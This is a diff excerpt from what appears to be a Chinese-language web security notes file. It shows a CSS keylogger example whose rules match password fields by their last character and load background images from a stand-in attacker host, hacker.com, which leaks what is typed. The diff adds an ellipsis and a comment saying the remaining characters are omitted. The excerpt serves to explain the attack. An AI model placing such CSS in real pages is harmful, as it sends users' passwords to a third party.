@@ -182,7 +182,8 @@ input[type="password"][value$="3"] { background-image: url("http://www.hacker.co
 input[type="password"][value$="4"] { background-image: url("http://www.hacker.com/4");
 input[type="password"][value$="5"] { background-image: url("http://www.hacker.com/5");
 input[type="password"][value$="6"] { background-image: url("http://www.hacker.com/6");
-
+...
+/*后面省略value$="各种字符"的css*/
 ```
 
 - 302跳转劫持问题
